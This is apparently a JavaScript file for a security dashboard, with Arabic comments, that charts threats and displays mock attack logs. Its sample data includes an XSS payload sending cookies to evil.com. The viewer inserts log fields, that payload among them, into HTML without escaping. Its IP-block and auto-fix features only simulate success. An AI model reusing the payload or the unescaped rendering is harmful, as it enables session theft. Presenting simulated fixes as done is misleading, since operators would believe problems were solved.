/**
 * مكونات لوحة معلومات الأمان
 * يوفر وظائف لعرض معلومات الأمان وسجلات النشاط
 */

// تهيئة الرسوم البيانية
document.addEventListener('DOMContentLoaded', () => {
  initSecurityCharts();
  loadSecurityLogs();
  setupEventListeners();
});

// إنشاء الرسوم البيانية لتحليلات الأمان
function initSecurityCharts() {
  // رسم بياني للتهديدات الأمنية
  if (document.getElementById('threatChart')) {
    const ctx = document.getElementById('threatChart').getContext('2d');
    new Chart(ctx, {
      type: 'bar',
      data: {
        labels: ['محاولات XSS', 'SQL Injection', 'قوة غاشمة', 'الروبوتات', 'تجاوز السرعة', 'أخرى'],
        datasets: [{
          label: 'التهديدات المكتشفة هذا الأسبوع',
          data: [12, 5, 8, 25, 10, 3],
          backgroundColor: [
            'rgba(255, 99, 132, 0.7)',
            'rgba(54, 162, 235, 0.7)',
            'rgba(255, 206, 86, 0.7)',
            'rgba(75, 192, 192, 0.7)',
            'rgba(153, 102, 255, 0.7)',
            'rgba(255, 159, 64, 0.7)'
          ],
          borderWidth: 1
        }]
      },
      options: {
        responsive: true,
        scales: {
          y: {
            beginAtZero: true,
            precision: 0
          }
        }
      }
    });
  }

  // رسم بياني دائري لحالة الحماية
  if (document.getElementById('protectionChart')) {
    const ctx = document.getElementById('protectionChart').getContext('2d');
    new Chart(ctx, {
      type: 'doughnut',
      data: {
        labels: ['محمي', 'مخاطر متوسطة', 'مخاطر عالية'],
        datasets: [{
          data: [75, 20, 5],
          backgroundColor: [
            'rgba(75, 192, 192, 0.7)',
            'rgba(255, 206, 86, 0.7)',
            'rgba(255, 99, 132, 0.7)'
          ],
          borderWidth: 1
        }]
      },
      options: {
        responsive: true,
        plugins: {
          legend: {
            position: 'bottom'
          }
        }
      }
    });
  }
}

// تحميل سجلات الأمان
function loadSecurityLogs(page = 1, limit = 10) {
  const logsContainer = document.getElementById('securityLogs');
  if (!logsContainer) return;

  // عرض مؤشر التحميل
  logsContainer.innerHTML = '<div class="text-center p-4"><div class="spinner-border text-primary" role="status"></div><p class="mt-2">جاري تحميل السجلات...</p></div>';

  // محاكاة تحميل البيانات
  setTimeout(() => {
    // بيانات سجلات وهمية للعرض
    const logs = [
      { id: 1, type: 'AUTH_FAILURE', ip: '192.168.1.105', timestamp: '2025-05-29 14:23:45', details: 'محاولة تسجيل دخول فاشلة - مستخدم: admin', severity: 'متوسط' },
      { id: 2, type: 'XSS_ATTEMPT', ip: '45.63.12.78', timestamp: '2025-05-29 12:15:30', details: 'محاولة حقن XSS في حقل التعليقات', severity: 'عالي' },
      { id: 3, type: 'AUTH_SUCCESS', ip: '192.168.1.1', timestamp: '2025-05-29 10:42:18', details: 'تسجيل دخول ناجح - مستخدم: admin', severity: 'منخفض' },
      { id: 4, type: 'FILE_ACCESS', ip: '192.168.1.1', timestamp: '2025-05-29 10:45:22', details: 'الوصول إلى ملف حساس: config/database.php', severity: 'متوسط' },
      { id: 5, type: 'RATE_LIMIT', ip: '87.123.45.67', timestamp: '2025-05-29 09:12:03', details: 'تجاوز الحد الأقصى لمعدل الطلبات (API)', severity: 'متوسط' },
      { id: 6, type: 'SQL_INJECTION', ip: '123.45.67.89', timestamp: '2025-05-28 22:34:15', details: 'محاولة SQL Injection في معلمة المستخدم', severity: 'عالي' },
      { id: 7, type: 'CSRF_ATTEMPT', ip: '98.76.54.32', timestamp: '2025-05-28 18:27:45', details: 'محاولة CSRF في نموذج الملف الشخصي', severity: 'عالي' },
      { id: 8, type: 'AUTH_FAILURE', ip: '192.168.1.105', timestamp: '2025-05-28 16:12:38', details: 'محاولة تسجيل دخول فاشلة - مستخدم: admin', severity: 'متوسط' },
      { id: 9, type: '2FA_SUCCESS', ip: '192.168.1.1', timestamp: '2025-05-28 13:22:10', details: 'تحقق ثنائي ناجح - مستخدم: admin', severity: 'منخفض' },
      { id: 10, type: 'CONFIG_CHANGE', ip: '192.168.1.1', timestamp: '2025-05-28 13:18:45', details: 'تغيير إعدادات الأمان - تمكين CAPTCHA', severity: 'متوسط' }
    ];
    
    // إنشاء جدول السجلات
    let html = `
      <div class="table-responsive">
        <table class="table table-hover table-striped">
          <thead>
            <tr>
              <th scope="col">النوع</th>
              <th scope="col">IP</th>
              <th scope="col">التاريخ</th>
              <th scope="col">التفاصيل</th>
              <th scope="col">الخطورة</th>
              <th scope="col">إجراءات</th>
            </tr>
          </thead>
          <tbody>
    `;
    
    logs.forEach(log => {
      // تحديد لون الخطورة
      let severityClass = 'success';
      if (log.severity === 'متوسط') severityClass = 'warning';
      if (log.severity === 'عالي') severityClass = 'danger';
      
      html += `
        <tr>
          <td><code>${log.type}</code></td>
          <td><span class="badge bg-secondary">${log.ip}</span></td>
          <td>${log.timestamp}</td>
          <td>${log.details}</td>
          <td><span class="badge bg-${severityClass}">${log.severity}</span></td>
          <td>
            <button class="btn btn-sm btn-info" onclick="viewLogDetails(${log.id})">
              <i class="fas fa-eye"></i>
            </button>
            <button class="btn btn-sm btn-danger" onclick="blockIP('${log.ip}')">
              <i class="fas fa-ban"></i>
            </button>
          </td>
        </tr>
      `;
    });
    
    html += `
          </tbody>
        </table>
      </div>
      
      <!-- ترقيم الصفحات -->
      <nav aria-label="Page navigation" class="mt-4">
        <ul class="pagination justify-content-center">
          <li class="page-item disabled">
            <a class="page-link" href="#" tabindex="-1">السابق</a>
          </li>
          <li class="page-item active"><a class="page-link" href="#">1</a></li>
          <li class="page-item"><a class="page-link" href="#">2</a></li>
          <li class="page-item"><a class="page-link" href="#">3</a></li>
          <li class="page-item">
            <a class="page-link" href="#">التالي</a>
          </li>
        </ul>
      </nav>
    `;
    
    logsContainer.innerHTML = html;
  }, 500);
}

// مشاهدة تفاصيل سجل محدد
function viewLogDetails(logId) {
  // محاكاة تحميل بيانات السجل من الخادم
  fetch(`/api/security/logs/${logId}`)
    .then(response => response.json())
    .catch(() => {
      // للعرض التوضيحي فقط - بيانات وهمية
      return {
        id: logId,
        type: 'XSS_ATTEMPT',
        ip: '45.63.12.78',
        user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        timestamp: '2025-05-29 12:15:30',
        details: 'محاولة حقن XSS في حقل التعليقات',
        payload: '<script>document.location="https://evil.com/steal.php?cookie="+document.cookie</script>',
        severity: 'عالي',
        status: 'تم الحظر'
      };
    })
    .then(data => {
      // عرض التفاصيل في نافذة منبثقة
      Swal.fire({
        title: 'تفاصيل سجل الأمان',
        html: `
          <div class="text-right">
            <div class="mb-3">
              <label class="font-weight-bold">المعرف:</label>
              <span>${data.id}</span>
            </div>
            <div class="mb-3">
              <label class="font-weight-bold">النوع:</label>
              <span class="badge bg-danger">${data.type}</span>
            </div>
            <div class="mb-3">
              <label class="font-weight-bold">عنوان IP:</label>
              <span>${data.ip}</span>
            </div>
            <div class="mb-3">
              <label class="font-weight-bold">متصفح المستخدم:</label>
              <p class="text-muted small">${data.user_agent}</p>
            </div>
            <div class="mb-3">
              <label class="font-weight-bold">التاريخ:</label>
              <span>${data.timestamp}</span>
            </div>
            <div class="mb-3">
              <label class="font-weight-bold">التفاصيل:</label>
              <p>${data.details}</p>
            </div>
            <div class="mb-3">
              <label class="font-weight-bold">البيانات:</label>
              <pre class="bg-light p-2 text-danger"><code>${data.payload}</code></pre>
            </div>
            <div class="mb-3">
              <label class="font-weight-bold">الخطورة:</label>
              <span class="badge bg-danger">${data.severity}</span>
            </div>
            <div class="mb-3">
              <label class="font-weight-bold">الحالة:</label>
              <span>${data.status}</span>
            </div>
          </div>
        `,
        confirmButtonText: 'إغلاق',
        width: '600px'
      });
    });
}

// حظر عنوان IP
function blockIP(ip) {
  Swal.fire({
    title: 'تأكيد الحظر',
    text: `هل أنت متأكد من رغبتك في حظر عنوان IP: ${ip}؟`,
    icon: 'warning',
    showCancelButton: true,
    confirmButtonText: 'نعم، حظر',
    cancelButtonText: 'إلغاء'
  }).then((result) => {
    if (result.isConfirmed) {
      // محاكاة إرسال طلب لحظر IP
      Swal.fire({
        title: 'جاري الحظر...',
        text: 'يرجى الانتظار',
        allowOutsideClick: false,
        showConfirmButton: false,
        willOpen: () => {
          Swal.showLoading();
        }
      });
      
      setTimeout(() => {
        Swal.fire(
          'تم الحظر!',
          `تم حظر عنوان IP ${ip} بنجاح.`,
          'success'
        );
      }, 1500);
    }
  });
}

// تصدير سجلات الأمان
function exportSecurityLogs(format) {
  Swal.fire({
    title: 'جاري التصدير...',
    text: 'يرجى الانتظار',
    allowOutsideClick: false,
    showConfirmButton: false,
    willOpen: () => {
      Swal.showLoading();
    }
  });
  
  setTimeout(() => {
    Swal.close();
    
    // محاكاة تنزيل الملف
    const link = document.createElement('a');
    link.href = `/api/security/logs/export?format=${format}`;
    link.download = `security-logs-${new Date().toISOString().slice(0, 10)}.${format}`;
    link.click();
    
    Swal.fire(
      'تم التصدير!',
      `تم تصدير سجلات الأمان بتنسيق ${format.toUpperCase()} بنجاح.`,
      'success'
    );
  }, 1500);
}

// إعداد مستمعي الأحداث
function setupEventListeners() {
  // زر تحديث السجلات
  const refreshBtn = document.getElementById('refreshLogs');
  if (refreshBtn) {
    refreshBtn.addEventListener('click', () => loadSecurityLogs());
  }
  
  // أزرار التصدير
  const exportCSV = document.getElementById('exportCSV');
  if (exportCSV) {
    exportCSV.addEventListener('click', () => exportSecurityLogs('csv'));
  }
  
  const exportJSON = document.getElementById('exportJSON');
  if (exportJSON) {
    exportJSON.addEventListener('click', () => exportSecurityLogs('json'));
  }
  
  const exportPDF = document.getElementById('exportPDF');
  if (exportPDF) {
    exportPDF.addEventListener('click', () => exportSecurityLogs('pdf'));
  }
  
  // زر تحديث الإحصائيات
  const refreshStats = document.getElementById('refreshStats');
  if (refreshStats) {
    refreshStats.addEventListener('click', () => {
      refreshStats.disabled = true;
      refreshStats.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> جاري التحديث...';
      
      setTimeout(() => {
        initSecurityCharts();
        refreshStats.disabled = false;
        refreshStats.innerHTML = '<i class="fas fa-sync-alt"></i> تحديث';
        
        // إظهار إشعار
        const toast = document.createElement('div');
        toast.className = 'position-fixed bottom-0 end-0 p-3';
        toast.style.zIndex = 5;
        toast.innerHTML = `
          <div class="toast show" role="alert" aria-live="assertive" aria-atomic="true">
            <div class="toast-header">
              <i class="fas fa-shield-alt text-primary me-2"></i>
              <strong class="me-auto">نظام الأمان</strong>
              <small>الآن</small>
              <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
            </div>
            <div class="toast-body">
              تم تحديث إحصائيات الأمان بنجاح!
            </div>
          </div>
        `;
        document.body.appendChild(toast);
        
        setTimeout(() => {
          document.body.removeChild(toast);
        }, 3000);
      }, 1000);
    });
  }
}

// فحص صحة تكوين الأمان
function runSecurityCheck() {
  const resultsContainer = document.getElementById('securityCheckResults');
  if (!resultsContainer) return;
  
  // عرض مؤشر التحميل
  resultsContainer.innerHTML = '<div class="text-center p-4"><div class="spinner-border text-primary" role="status"></div><p class="mt-2">جاري فحص إعدادات الأمان...</p></div>';
  
  // محاكاة فحص الأمان
  setTimeout(() => {
    const checks = [
      { name: 'تكوين HTTPS', status: 'pass', details: 'إعادة التوجيه HTTPS مفعل بشكل صحيح' },
      { name: 'رؤوس الأمان', status: 'pass', details: 'جميع رؤوس الأمان HTTP الموصى بها موجودة' },
      { name: 'تأمين ملف الكوكيز', status: 'pass', details: 'إعدادات الكوكيز آمنة (HttpOnly، Secure، SameSite)' },
      { name: 'الحماية من CSRF', status: 'pass', details: 'رموز CSRF مستخدمة في جميع النماذج' },
      { name: 'إعدادات PHP', status: 'warning', details: 'وضع التشغيل معروض للمستخدمين، يوصى بإخفائه' },
      { name: 'تحديثات المكتبات', status: 'warning', details: 'بعض المكتبات تحتاج إلى تحديث' },
      { name: 'سياسة أمان المحتوى', status: 'fail', details: 'لم يتم تكوين CSP بشكل صحيح' },
      { name: 'مسح المجلدات', status: 'pass', details: 'تم تعطيل مسح المجلدات' },
      { name: 'اتصالات قاعدة البيانات', status: 'pass', details: 'اتصالات قاعدة البيانات مشفرة' },
      { name: 'التحقق الثنائي', status: 'warning', details: '2FA غير مفعل لجميع حسابات المشرفين' }
    ];
    
    // حساب الإحصائيات
    const stats = {
      pass: checks.filter(c => c.status === 'pass').length,
      warning: checks.filter(c => c.status === 'warning').length,
      fail: checks.filter(c => c.status === 'fail').length,
    };
    
    const score = Math.round(((stats.pass * 1) + (stats.warning * 0.5)) / checks.length * 100);
    
    // إنشاء نتائج الفحص
    let html = `
      <div class="card shadow-sm mb-4">
        <div class="card-body">
          <h5 class="card-title">نتيجة الفحص الأمني</h5>
          <div class="d-flex align-items-center mb-3">
            <div class="progress flex-grow-1 mx-3" style="height: 10px;">
              <div class="progress-bar bg-success" role="progressbar" style="width: ${score}%;" aria-valuenow="${score}" aria-valuemin="0" aria-valuemax="100"></div>
            </div>
            <span class="h3 mb-0">${score}%</span>
          </div>
          <div class="d-flex justify-content-around text-center">
            <div>
              <span class="badge bg-success rounded-pill d-block p-2 mb-1">${stats.pass}</span>
              <small>ناجح</small>
            </div>
            <div>
              <span class="badge bg-warning rounded-pill d-block p-2 mb-1">${stats.warning}</span>
              <small>تحذير</small>
            </div>
            <div>
              <span class="badge bg-danger rounded-pill d-block p-2 mb-1">${stats.fail}</span>
              <small>فشل</small>
            </div>
          </div>
        </div>
      </div>
      
      <div class="list-group mb-4">
    `;
    
    checks.forEach(check => {
      let statusClass = 'success';
      let statusIcon = 'check-circle';
      
      if (check.status === 'warning') {
        statusClass = 'warning';
        statusIcon = 'exclamation-triangle';
      } else if (check.status === 'fail') {
        statusClass = 'danger';
        statusIcon = 'times-circle';
      }
      
      html += `
        <div class="list-group-item">
          <div class="d-flex w-100 justify-content-between align-items-center">
            <h6 class="mb-1">
              <i class="fas fa-${statusIcon} text-${statusClass} me-2"></i>
              ${check.name}
            </h6>
            <span class="badge bg-${statusClass}">${check.status}</span>
          </div>
          <p class="mb-1 text-muted small">${check.details}</p>
        </div>
      `;
    });
    
    html += `
      </div>
      
      <div class="text-center">
        <button class="btn btn-primary" onclick="fixSecurityIssues()">
          <i class="fas fa-wrench"></i> إصلاح المشكلات تلقائياً
        </button>
        <button class="btn btn-outline-secondary ms-2" onclick="downloadSecurityReport()">
          <i class="fas fa-download"></i> تنزيل التقرير
        </button>
      </div>
    `;
    
    resultsContainer.innerHTML = html;
  }, 2000);
}

// إصلاح مشكلات الأمان تلقائياً
function fixSecurityIssues() {
  Swal.fire({
    title: 'إصلاح مشكلات الأمان',
    text: 'هل ترغب في محاولة إصلاح مشكلات الأمان المكتشفة تلقائياً؟',
    icon: 'question',
    showCancelButton: true,
    confirmButtonText: 'نعم، إصلاح المشكلات',
    cancelButtonText: 'إلغاء'
  }).then((result) => {
    if (result.isConfirmed) {
      Swal.fire({
        title: 'جاري الإصلاح...',
        html: '<div id="repair-progress"></div>',
        allowOutsideClick: false,
        showConfirmButton: false,
        willOpen: () => {
          Swal.showLoading();
          const content = Swal.getHtmlContainer();
          const progress = content.querySelector('#repair-progress');
          
          let currentStep = 0;
          const steps = [
            'جاري فحص تكوين ملف .htaccess...',
            'تحديث رؤوس الأمان...',
            'تكوين سياسة أمان المحتوى...',
            'إصلاح إعدادات PHP...',
            'تحديث المكتبات...',
            'تكوين التحقق الثنائي للمشرفين...',
            'تطبيق التغييرات...'
          ];
          
          const timer = setInterval(() => {
            progress.textContent = steps[currentStep];
            currentStep++;
            
            if (currentStep >= steps.length) {
              clearInterval(timer);
              setTimeout(() => {
                Swal.fire({
                  title: 'تم الإصلاح!',
                  text: 'تم إصلاح معظم مشكلات الأمان بنجاح. قم بتشغيل الفحص مرة أخرى للتحقق.',
                  icon: 'success',
                  confirmButtonText: 'حسناً'
                }).then(() => {
                  runSecurityCheck();
                });
              }, 1000);
            }
          }, 1000);
        }
      });
    }
  });
}

// تنزيل تقرير الأمان
function downloadSecurityReport() {
  Swal.fire({
    title: 'جاري إنشاء التقرير...',
    text: 'يرجى الانتظار',
    allowOutsideClick: false,
    showConfirmButton: false,
    willOpen: () => {
      Swal.showLoading();
    }
  });
  
  setTimeout(() => {
    Swal.close();
    
    // محاكاة تنزيل الملف
    const link = document.createElement('a');
    link.href = '/api/security/report/download';
    link.download = `security-report-${new Date().toISOString().slice(0, 10)}.pdf`;
    link.click();
    
    Swal.fire({
      title: 'تم التنزيل!',
      text: 'تم إنشاء تقرير الأمان وتنزيله بنجاح.',
      icon: 'success',
      confirmButtonText: 'حسناً'
    });
  }, 2000);
}
